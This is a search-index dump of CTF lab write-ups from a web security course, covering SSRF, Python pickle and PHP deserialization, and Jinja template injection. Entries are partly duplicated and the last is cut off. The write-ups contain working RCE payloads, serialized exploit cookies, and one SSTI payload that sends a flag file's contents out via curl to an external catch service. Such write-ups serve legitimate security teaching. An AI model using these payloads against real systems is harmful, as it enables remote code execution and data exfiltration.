0x13(Lab - SSRFrog)","section":"Securities","content":" Simple Web 0x13(Lab - SSRFrog) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8501/\nBackground # javascript Set() Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」\nSource code # :::spoiler source code\nconst express = require(\u0026#34;express\u0026#34;); const http = require(\u0026#34;http\u0026#34;); const app = express(); app.get(\u0026#34;/source\u0026#34;, (req, res) =\u0026gt; { return res.sendFile(__filename); }) app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const { url } = req.query; if (!url || typeof url !== \u0026#39;string\u0026#39;) return res.sendFile(__dirname + \u0026#34;/index.html\u0026#34;); // no duplicate characters in `url` if (url.length !== new Set(url).size) return res.sendFile(__dirname + \u0026#34;/frog.png\u0026#34;); try { http.get(url, resp =\u0026gt; { resp.setEncoding(\u0026#34;utf-8\u0026#34;); resp.statusCode === 200 ? resp.on(\u0026#39;data\u0026#39;, data =\u0026gt; res.send(data)) : res.send(\u0026#34;:(\u0026#34;); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; res.send(\u0026#34;WTF?\u0026#34;)); } catch (error) { res.send(\u0026#34;WTF?\u0026#34;); } }); app.listen(3000, \u0026#39;0.0.0.0\u0026#39;); :::\nSimply speaking, it\u0026rsquo;ll call a Set() object that will filter duplicate characters We also can find the hint in page source Exploit # The hint said flag is on http://the.c0o0o0l-fl444g.server.internal:80, so we need to meet the first requirement - every single character is unique. We can use Domain Obfuscator to replace the similar characters. Payload htTp:/\\ⓉₕE．ℭ⓪ᴼ₀o０Ⅼ-Ⓕｌ₄4４ⓖ｡ₛⒺʳⓋₑⓇ.㏌ₜｅᴿ㎁ˡ htTp:/\\ⓉｈE。Ⅽ⁰ₒ０O0ℓ-ｆᴸ④４⁴G．ＳＥRｖⅇⓡ.ⁱNｔₑrｎAℒ Reference # SSRFrog Punycode converter\n"},{"id":448,"href":"/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/","title":"Simple Web 0x14(Lab - Debug)","section":"Securities","content":" Simple Web 0x14(Lab - Debug) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:9020/\nBackground # Source code # :::spoiler source code\nfrom flask import Flask, request, Response import urllib.request import json app = Flask(__name__) app.config[\u0026#39;FLAG\u0026#39;] = \u0026#34;FL4G{fake_flag}\u0026#34; @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#39;\u0026#39;\u0026#39; \u0026lt;form action=\u0026#34;/proxy\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;url\u0026#34; placeholder=\u0026#34;URL\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;/source\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;/debug\u0026#34;\u0026gt;Debug\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#34;/proxy\u0026#34;) def proxy(): url = request.args.get(\u0026#34;url\u0026#34;) if url is None: return \u0026#34;No URL provided\u0026#34; if \u0026#34;https://\u0026#34; not in url: url = \u0026#34;https://\u0026#34; + url try: with urllib.request.urlopen(url) as response: return response.read() except urllib.error.HTTPError as e: return str(e) @app.route(\u0026#34;/debug\u0026#34;) def debug(): # only allow access for localhost if request.remote_addr != \u0026#34;127.0.0.1\u0026#34;: return \u0026#34;Access denied\u0026#34;, 403 return json.dumps(app.config, default=lambda _: None) @app.route(\u0026#34;/source\u0026#34;) def source(): import re source_code = open(__file__).read() source_code = re.sub(r\u0026#39;FLAG{.*}\u0026#39;, r\u0026#39;FL4G{fake_flag}\u0026#39;, source_code, count=1) return Response(source_code, mimetype=\u0026#39;text/plain\u0026#39;) :::\nAnalyze # /index page It has a blank that can type arbitrary URL and it\u0026rsquo;ll send to /proxy route page to verify. /proxy page It\u0026rsquo;ll add https:// if the URL has no the string /debug page If the request URL is not 127.0.0.1 then it\u0026rsquo;ll forbidden the request, otherwise, it\u0026rsquo;ll print the configuration with json type hint: it has loaded the flag in app configuration already, so we just tried to use SSRF to access to /debug. Exploit - SSRF # We need to bypass https:// constraint and add in our URL like below. Payload: http://127.0.0.1/debug?https://\n"},{"id":449,"href":"/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/","title":"Simple Web 0x15.5(Pickle)","section":"Securities","content":" Simple Web 0x15.5(Pickle) # tags: NTUSTWS CTF Web # Background - Pickle # Python magic method: __reduce__ __recude__ is used to define what needs to be done when deserializing. Web Hacking | 終章【EDU-CTF 2021】\nSource code # :::spoiler exploit.py\nimport pickle import os import pickletools class exploit(object): def __reduce__(self): return (os.system, (\u0026#39;pwd\u0026#39;,)) serialized = pickle.dumps(exploit()) print(bytes.hex(serialized)) optim_s = pickletools.optimize(serialized) print(pickletools.dis(serialized)) print(pickletools.dis(optim_s)) :::\n:::spoiler server_app.py\nimport pickle serialized = bytes.fromhex(input(\u0026#39;Data: \u0026#39;)) pickle.loads(serialized) :::\nOutput \u0026amp; Analyze # In Linux # GLOBAL 'posix system': import posix system(which is a library in linux) BINPUT 0: put the top stack to position 0 at Memo structure(array) BINUNICODE: push string \u0026lsquo;pwd\u0026rsquo; to stack top TUPLE1: let the element of top stack be a tuple type REDUCE: args = stack.top() # which is \u0026#39;pwd\u0026#39; in tuple type func = stack.top() # which is \u0026#39;posix system\u0026#39; stack.push(func(args)) # then it\u0026#39;ll execute os.system(\u0026#39;pwd\u0026#39;) and push the output to stack In Windows # Much similar with the outcome on linux environment.\nAnalyze # How to RCE? # $ python exploit.py | python server_app.py Data: /home/sbk6401/NTUSTWS/deserialization How did it do? First, exploit.py will serialize the exploit function and turned it to byte.hex then send it server_app.py Then server_app.py will deserialize it and during the process, it\u0026rsquo;ll execute magic method __reduce__, suddenly, it\u0026rsquo;ll execute os.system('pwd') at the same time → RCE\n"},{"id":450,"href":"/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/","title":"Simple Web 0x15(Lab - `Jinja`)","section":"Securities","content":" Simple Web 0x15(Lab - Jinja) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8700/\nBackground # Web Security 0x1\nSource code # :::spoiler code\nfrom flask import Flask, render_template_string, request, send_file app = Flask(__name__) @app.get(\u0026#34;/\u0026#34;) def home(): return render_template_string(\u0026#34;\u0026#34;\u0026#34; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Your name\u0026#34;\u0026gt; \u0026lt;button\u0026gt;submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;/source\u0026#34;\u0026gt;Source code\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026#34;\u0026#34;\u0026#34;) @app.post(\u0026#34;/\u0026#34;) def welcome_message(): name = request.form.get(\u0026#39;name\u0026#39;) return render_template_string(\u0026#34;\u0026lt;p\u0026gt;Hello, \u0026#34; + name + \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;) @app.get(\u0026#34;/source\u0026#34;) def source(): return send_file(__file__, mimetype=\u0026#34;text/plain\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(threaded=True, debug=True) :::\nExploit # Easy way # payload: {{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen'](\u0026quot;cat /th1s_15_fl4ggggggg\u0026quot;).read()}} Need Tool way - Beeceptor # Beeceptor will catch our result from curl. It\u0026rsquo;ll execute cat /th1s_15_fl4ggggggg first and the result will be sent to Beeceptor as attached data by curl. Payload:\n{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;curl {Beeceptor URL} -d \u0026#34;`cat /th1s_15_fl4ggggggg`\u0026#34;\u0026#39;)}} Flag: FLAG{ssti.__class__.__pwn__}\n"},{"id":451,"href":"/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/","title":"Simple Web 0x16.5(php unserialize)","section":"Securities","content":" Simple Web 0x16.5(php unserialize) # tags: NTUSTWS CTF Web # Background # php magic method Source code # class cat { public $sound = \u0026#39;ls\u0026#39;; function __wakeup() { system(\u0026#34;echo\u0026#34;.$this-\u0026gt;sound); } } $cat = unserialize($_GET[\u0026#39;cat\u0026#39;]); Description \u0026amp; Analyze # $ php -a php \u0026gt; class cat php \u0026gt; public { php { public $sound = \u0026#39;ls\u0026#39;; php { function __wakeup() php { { php { system(\u0026#34;echo \u0026#34;.$this-\u0026gt;sound); php { } php { } php \u0026gt; $_GET[\u0026#39;cat\u0026#39;]=\u0026#39;O:3:\u0026#34;cat\u0026#34;:1:{s:5:\u0026#34;sound\u0026#34;;s:4:\u0026#34;meow\u0026#34;;}\u0026#39;; php \u0026gt; $cat = unserialize($_GET[\u0026#39;cat\u0026#39;]); meow php \u0026gt; $_GET[\u0026#39;cat\u0026#39;]=\u0026#39;O:3:\u0026#34;cat\u0026#34;:1:{s:5:\u0026#34;sound\u0026#34;;s:4:\u0026#34;;id;\u0026#34;;}\u0026#39;; php \u0026gt; $cat = unserialize($_GET[\u0026#39;cat\u0026#39;]); uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker) This is a typical command injection. The magic method __wakeup() will be called when unserialized something.\nReference # "},{"id":452,"href":"/security/course/ntu-cs/web/simple-web---0x11lab---pickle/","title":"Simple Web 0x16(Lab - Pickle)","section":"Securities","content":" Simple Web 0x16(Lab - Pickle) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven\u0026rsquo;t login http://h4ck3r.quest\nBackground # 0x15.5(Pickle)\nSource code # :::spoiler code\nfrom flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route(\u0026#34;/sauce\u0026#34;) def sauce(): return send_file(__file__, mimetype=\u0026#34;text/plain\u0026#34;) @app.route(\u0026#34;/\u0026#34;) def main(): session = request.cookies.get(\u0026#34;session\u0026#34;) if session == None: return \u0026#39;\u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\u0026#39; +\\ \u0026#39;\u0026lt;p\u0026gt;Name: \u0026lt;input name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026#39; +\\ \u0026#39;\u0026lt;p\u0026gt;Age: \u0026lt;input name=\u0026#34;age\u0026#34; type=\u0026#34;number\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026#39; +\\ \u0026#39;\u0026lt;button\u0026gt;Submit\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;a href=\u0026#34;/sauce\u0026#34;\u0026gt;Source code\u0026lt;/a\u0026gt;\u0026#39; else: user = pickle.loads(base64.b64decode(session)) return f\u0026#39;\u0026lt;p\u0026gt;Name: {user[\u0026#34;name\u0026#34;]}\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;Age: {user[\u0026#34;age\u0026#34;]}\u0026lt;/p\u0026gt;\u0026#39; @app.route(\u0026#34;/login\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def login(): user = base64.b64encode(pickle.dumps({ \u0026#34;name\u0026#34;: request.form.get(\u0026#39;name\u0026#39;), \u0026#34;age\u0026#34;: int(request.form.get(\u0026#39;age\u0026#39;)) })) resp = make_response(redirect(\u0026#39;/\u0026#39;)) resp.set_cookie(\u0026#34;session\u0026#34;, user) return resp :::\nDescription \u0026amp; Analyze # In main function, it\u0026rsquo;ll request session and parse it by base64 then deserialize it. If session is none, you can enter your name and age then it\u0026rsquo;ll serialize the data and transfer by base64. For example: name=123, age=123 The Cookie: session=gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==\n\u0026gt;\u0026gt;\u0026gt; pickle.loads(base64.b64decode(\u0026#39;gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==\u0026#39;)) {\u0026#39;name\u0026#39;: \u0026#39;123\u0026#39;, \u0026#39;age\u0026#39;: 123} Exploit # Construct exploit function Note that the format must be {'name': '', 'age': ''}\nPayload\nclass exploit(object): def __reduce__(self): return (__import__(\u0026#39;subprocess\u0026#39;).getoutput, (\u0026#39;ls\u0026#39;,)) serialized = pickle.dumps({ \u0026#34;name\u0026#34;: \u0026#39;123\u0026#39;, \u0026#34;age\u0026#34;: exploit() }) Note that, must not use os.system in this situation. \u0026lsquo;Cause in addition to the result of os.system('{command}'), it\u0026rsquo;ll return exit status code.\nOn Unix, the return value is the exit status of the process encoded in the format specified for wait(). Note that POSIX does not specify the meaning of the return value of the C system() function, so the return value of the Python function is system-dependent.\nSo that if we use os.system as payload directly the output will not be render correctly.\nFor instance: class exploit(object): def __reduce__(self): return (os.system, (\u0026#39;ls\u0026#39;,)) serialized = pickle.dumps({ \u0026#34;name\u0026#34;: \u0026#39;123\u0026#39;, \u0026#34;age\u0026#34;: exploit() }) optim_s = base64.b64encode(serialized) print(pickle.loads(base64.b64decode(optim_s))) $ python pickle_exp.py exploit.py pickle_exp.py server_app.py {\u0026#39;name\u0026#39;: \u0026#39;123\u0026#39;, \u0026#39;age\u0026#39;: 0} or You can execute it in wsl directly. So, you can use subprocess.getoutput to fetch the outcome without exit code Whole exploit\nimport pickle import os import pickletools import base64 class exploit(object): def __reduce__(self): return (__import__(\u0026#39;subprocess\u0026#39;).getoutput, (\u0026#39;ls -al /\u0026#39;,)) serialized = pickle.dumps({ \u0026#34;name\u0026#34;: \u0026#39;123\u0026#39;, \u0026#34;age\u0026#34;: exploit() }) optim_s = pickletools.optimize(serialized) cookie = base64.b64encode(optim_s).decode() os.system(f\u0026#34;curl http://h4ck3r.quest:8600/ --cookie \u0026#39;session={cookie}\u0026#39;\u0026#34;) Result # "},{"id":453,"href":"/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/","title":"Simple Web 0x16(Lab - Pickle)","section":"Securities","content":" Simple Web 0x16(Lab - Pickle) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven\u0026rsquo;t login http://h4ck3r.quest\nBackground # 0x15.5(Pickle)\nSource code # :::spoiler code\nfrom flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route(\u0026#34;/sauce\u0026#34;) def sauce(): return send_file(__file__, mimetype=\u0026#34;text/plain\u0026#34;) @app.route(\u0026#34;/\u0026#34;) def main(): session = request.cookies.get(\u0026#34;session\u0026#34;) if session == None: return \u0026#39;\u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\u0026#39; +\\ \u0026#39;\u0026lt;p\u0026gt;Name: \u0026lt;input name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026#39; +\\ \u0026#39;\u0026lt;p\u0026gt;Age: \u0026lt;input name=\u0026#34;age\u0026#34; type=\u0026#34;number\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026#39; +\\ \u0026#39;\u0026lt;button\u0026gt;Submit\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;a href=\u0026#34;/sauce\u0026#34;\u0026gt;Source code\u0026lt;/a\u0026gt;\u0026#39; else: user = pickle.loads(base64.b64decode(session)) return f\u0026#39;\u0026lt;p\u0026gt;Name: {user[\u0026#34;name\u0026#34;]}\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;Age: {user[\u0026#34;age\u0026#34;]}\u0026lt;/p\u0026gt;\u0026#39; @app.route(\u0026#34;/login\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def login(): user = base64.b64encode(pickle.dumps({ \u0026#34;name\u0026#34;: request.form.get(\u0026#39;name\u0026#39;), \u0026#34;age\u0026#34;: int(request.form.get(\u0026#39;age\u0026#39;)) })) resp = make_response(redirect(\u0026#39;/\u0026#39;)) resp.set_cookie(\u0026#34;session\u0026#34;, user) return resp :::\nDescription \u0026amp; Analyze # In main function, it\u0026rsquo;ll request session and parse it by base64 then deserialize it. If session is none, you can enter your name and age then it\u0026rsquo;ll serialize the data and transfer by base64. For example: name=123, age=123 The Cookie: session=gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==\n\u0026gt;\u0026gt;\u0026gt; pickle.loads(base64.b64decode(\u0026#39;gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==\u0026#39;)) {\u0026#39;name\u0026#39;: \u0026#39;123\u0026#39;, \u0026#39;age\u0026#39;: 123} Exploit # Construct exploit function Note that the format must be {'name': '', 'age': ''}\nPayload\nclass exploit(object): def __reduce__(self): return (__import__(\u0026#39;subprocess\u0026#39;).getoutput, (\u0026#39;ls\u0026#39;,)) serialized = pickle.dumps({ \u0026#34;name\u0026#34;: \u0026#39;123\u0026#39;, \u0026#34;age\u0026#34;: exploit() }) Note that, must not use os.system in this situation. \u0026lsquo;Cause in addition to the result of os.system('{command}'), it\u0026rsquo;ll return exit status code.\nOn Unix, the return value is the exit status of the process encoded in the format specified for wait(). Note that POSIX does not specify the meaning of the return value of the C system() function, so the return value of the Python function is system-dependent.\nSo that if we use os.system as payload directly the output will not be render correctly.\nFor instance: class exploit(object): def __reduce__(self): return (os.system, (\u0026#39;ls\u0026#39;,)) serialized = pickle.dumps({ \u0026#34;name\u0026#34;: \u0026#39;123\u0026#39;, \u0026#34;age\u0026#34;: exploit() }) optim_s = base64.b64encode(serialized) print(pickle.loads(base64.b64decode(optim_s))) $ python pickle_exp.py exploit.py pickle_exp.py server_app.py {\u0026#39;name\u0026#39;: \u0026#39;123\u0026#39;, \u0026#39;age\u0026#39;: 0} or You can execute it in wsl directly. So, you can use subprocess.getoutput to fetch the outcome without exit code Whole exploit\nimport pickle import os import pickletools import base64 class exploit(object): def __reduce__(self): return (__import__(\u0026#39;subprocess\u0026#39;).getoutput, (\u0026#39;ls -al /\u0026#39;,)) serialized = pickle.dumps({ \u0026#34;name\u0026#34;: \u0026#39;123\u0026#39;, \u0026#34;age\u0026#34;: exploit() }) optim_s = pickletools.optimize(serialized) cookie = base64.b64encode(optim_s).decode() os.system(f\u0026#34;curl http://h4ck3r.quest:8600/ --cookie \u0026#39;session={cookie}\u0026#39;\u0026#34;) Result # "},{"id":454,"href":"/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/","title":"Simple Web 0x17(Lab - Baby Cat)","section":"Securities","content":" Simple Web 0x17(Lab - Baby Cat) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8601/\nBackground # 0x16.5(php unserialize)\nSource code # :::spoiler code\n\u0026lt;?php isset($_GET[\u0026#39;source\u0026#39;]) \u0026amp;\u0026amp; die(!show_source(__FILE__)); class Cat { public $name = \u0026#39;(guest cat)\u0026#39;; function __construct($name) { $this-\u0026gt;name = $name; } function __wakeup() { echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system(\u0026#34;cowsay \u0026#39;Welcome back, $this-\u0026gt;name\u0026#39;\u0026#34;); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; } } if (!isset($_COOKIE[\u0026#39;cat_session\u0026#39;])) { $cat = new Cat(\u0026#34;cat_\u0026#34; . rand(0, 0xffff)); setcookie(\u0026#39;cat_session\u0026#39;, base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE[\u0026#39;cat_session\u0026#39;])); } ?\u0026gt; \u0026lt;p\u0026gt;Hello, \u0026lt;?= $cat-\u0026gt;name ?\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;source code\u0026lt;/a\u0026gt; :::\nExploit - deserialize # Use psysh to test payload In local side, if you haven\u0026rsquo;t install cowsay, the payload should be '||ls -al'\n$ ./psysh \u0026gt; system(\u0026#34;cowsay \u0026#39;Welcome back, \u0026#39;||pwd\u0026#39;\u0026#39;\u0026#34;); sh: 1: cowsay: not found /home/sbk6401 = \u0026#34;/home/sbk6401\u0026#34; Construct testing case\n$ ./psysh \u0026gt; class Cat{ . public $name = \u0026#39;(guest cat)\u0026#39;; . function __construct($name){$this-\u0026gt;name = $name;} . function __wakeup(){system(\u0026#34;cowsay \u0026#39;Welcome back, $this-\u0026gt;name\u0026#39;\u0026#34;);}} \u0026gt; $cat = new Cat(\u0026#34;\u0026#39;\u0026amp;\u0026amp;ls -al /\u0026#39;\u0026#34;) = Cat {#2785 +name: \u0026#34;\u0026#39;\u0026amp;\u0026amp;ls -al /\u0026#39;\u0026#34;, } \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMjoiJyYmbHMgLWFsIC8nIjt9\u0026#34; Then changecat_session to TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMjoiJyYmbHMgLWFsIC8nIjt9 and we\u0026rsquo;ll get the response Get flag\n\u0026gt; $cat = new Cat(\u0026#34;\u0026#39;\u0026amp;\u0026amp;cat /flag_5fb2acebf1d0c558\u0026#39;\u0026#34;) = Cat {#2789 +name: \u0026#34;\u0026#39;\u0026amp;\u0026amp;cat /flag_5fb2acebf1d0c558\u0026#39;\u0026#34;, } \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMDoiJyYmY2F0IC9mbGFnXzVmYjJhY2ViZjFkMGM1NTgnIjt9\u0026#34; Again! Modify cat_session to TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMDoiJyYmY2F0IC9mbGFnXzVmYjJhY2ViZjFkMGM1NTgnIjt9 then we\u0026rsquo;ll get flag "},{"id":455,"href":"/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/","title":"Simple Web 0x17(Lab - Baby Cat)","section":"Securities","content":" Simple Web 0x17(Lab - Baby Cat) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8601/\nBackground # 0x16.5(php unserialize)\nSource code # :::spoiler code\n\u0026lt;?php isset($_GET[\u0026#39;source\u0026#39;]) \u0026amp;\u0026amp; die(!show_source(__FILE__)); class Cat { public $name = \u0026#39;(guest cat)\u0026#39;; function __construct($name) { $this-\u0026gt;name = $name; } function __wakeup() { echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system(\u0026#34;cowsay \u0026#39;Welcome back, $this-\u0026gt;name\u0026#39;\u0026#34;); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; } } if (!isset($_COOKIE[\u0026#39;cat_session\u0026#39;])) { $cat = new Cat(\u0026#34;cat_\u0026#34; . rand(0, 0xffff)); setcookie(\u0026#39;cat_session\u0026#39;, base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE[\u0026#39;cat_session\u0026#39;])); } ?\u0026gt; \u0026lt;p\u0026gt;Hello, \u0026lt;?= $cat-\u0026gt;name ?\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;source code\u0026lt;/a\u0026gt; :::\nExploit - deserialize # Use psysh to test payload In local side, if you haven\u0026rsquo;t install cowsay, the payload should be '||ls -al'\n$ ./psysh \u0026gt; system(\u0026#34;cowsay \u0026#39;Welcome back, \u0026#39;||pwd\u0026#39;\u0026#39;\u0026#34;); sh: 1: cowsay: not found /home/sbk6401 = \u0026#34;/home/sbk6401\u0026#34; Construct testing case\n$ ./psysh \u0026gt; class Cat{ . public $name = \u0026#39;(guest cat)\u0026#39;; . function __construct($name){$this-\u0026gt;name = $name;} . function __wakeup(){system(\u0026#34;cowsay \u0026#39;Welcome back, $this-\u0026gt;name\u0026#39;\u0026#34;);}} \u0026gt; $cat = new Cat(\u0026#34;\u0026#39;\u0026amp;\u0026amp;ls -al /\u0026#39;\u0026#34;) = Cat {#2785 +name: \u0026#34;\u0026#39;\u0026amp;\u0026amp;ls -al /\u0026#39;\u0026#34;, } \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMjoiJyYmbHMgLWFsIC8nIjt9\u0026#34; Then changecat_session to TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMjoiJyYmbHMgLWFsIC8nIjt9 and we\u0026rsquo;ll get the response Get flag\n\u0026gt; $cat = new Cat(\u0026#34;\u0026#39;\u0026amp;\u0026amp;cat /flag_5fb2acebf1d0c558\u0026#39;\u0026#34;) = Cat {#2789 +name: \u0026#34;\u0026#39;\u0026amp;\u0026amp;cat /flag_5fb2acebf1d0c558\u0026#39;\u0026#34;, } \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMDoiJyYmY2F0IC9mbGFnXzVmYjJhY2ViZjFkMGM1NTgnIjt9\u0026#34; Again! Modify cat_session to TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMDoiJyYmY2F0IC9mbGFnXzVmYjJhY2ViZjFkMGM1NTgnIjt9 then we\u0026rsquo;ll get flag "},{"id":456,"href":"/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/","title":"Simple Web 0x18(Lab - Magic Cat)","section":"Securities","content":" Simple Web 0x18(Lab - Magic Cat) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8602/\nBackground # None\u0026hellip;\nSource code # :::spoiler code\nisset($_GET[\u0026#39;source\u0026#39;]) \u0026amp;\u0026amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;MAGIC, $spell!\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; } } // Useless class? class Caster { public $cast_func = \u0026#39;intval\u0026#39;; function cast($val) { return ($this-\u0026gt;cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this-\u0026gt;magic = new Magic(); $this-\u0026gt;spell = $spell; } function __wakeup() { echo \u0026#34;Cat Wakeup!\\n\u0026#34;; $this-\u0026gt;magic-\u0026gt;cast($this-\u0026gt;spell); } } if (isset($_GET[\u0026#39;spell\u0026#39;])) { $cat = new Cat($_GET[\u0026#39;spell\u0026#39;]); } else if (isset($_COOKIE[\u0026#39;cat\u0026#39;])) { echo \u0026#34;Unserialize...\\n\u0026#34;; $cat = unserialize(base64_decode($_COOKIE[\u0026#39;cat\u0026#39;])); } else { $cat = new Cat(\u0026#34;meow-meow-magic\u0026#34;); } ?\u0026gt; \u0026lt;pre\u0026gt; This is your 🐱: \u0026lt;?php var_dump($cat) ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;p\u0026gt;Usage:\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;/?source\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;/?spell=the-spell-of-your-cat\u0026lt;/p\u0026gt; :::\nDescription \u0026amp; Analyze # Exploit - unserialize # Test payload in local side\n$ ./psysh \u0026gt; class Caster . { . public $cast_func = \u0026#39;intval\u0026#39;; . function cast($val) . { . return ($this-\u0026gt;cast_func)($val); . } . } \u0026gt; $test = new Caster = Caster {#2772 +cast_func: \u0026#34;intval\u0026#34;, } \u0026gt; $test-\u0026gt;cast_func = \u0026#39;system\u0026#39; = \u0026#34;system\u0026#34; \u0026gt; $test-\u0026gt;cast(\u0026#39;pwd\u0026#39;) = \u0026#34;/home/sbk6401\u0026#34; Construct serialized session\n\u0026gt; class Cat . { . public $magic; . public $spell; . function __construct($spell) . { . $this-\u0026gt;spell = $spell; . $this-\u0026gt;magic = new Caster(); . } . function __wakeup() . { . echo \u0026#34;Cat Wakeup!\\n\u0026#34;; . $this-\u0026gt;magic-\u0026gt;cast($this-\u0026gt;spell); . } . } \u0026gt; $cat = new Cat(\u0026#34;ls -al /\u0026#34;) = Cat {#2771 +magic: Caster {#2763 +cast_func: \u0026#34;intval\u0026#34;, }, +spell: \u0026#34;ls -al /\u0026#34;, } \u0026gt; $cat-\u0026gt;magic-\u0026gt;cast_func = \u0026#34;system\u0026#34; = \u0026#34;system\u0026#34; \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9\u0026#34; Get flag\n\u0026gt; $cat-\u0026gt;spell = \u0026#34;cat /flag*\u0026#34; = \u0026#34;cat /flag*\u0026#34; \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9\u0026#34; Flag: FLAG{magic_cat_pwnpwn}\nReference # PHP物件導向的第一課：class 【第十九天 - PHP反序列化(1)】\n"},{"id":457,"href":"/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/","title":"Simple Web 0x18(Lab - Magic Cat)","section":"Securities","content":" Simple Web 0x18(Lab - Magic Cat) # tags: NTUSTWS CTF 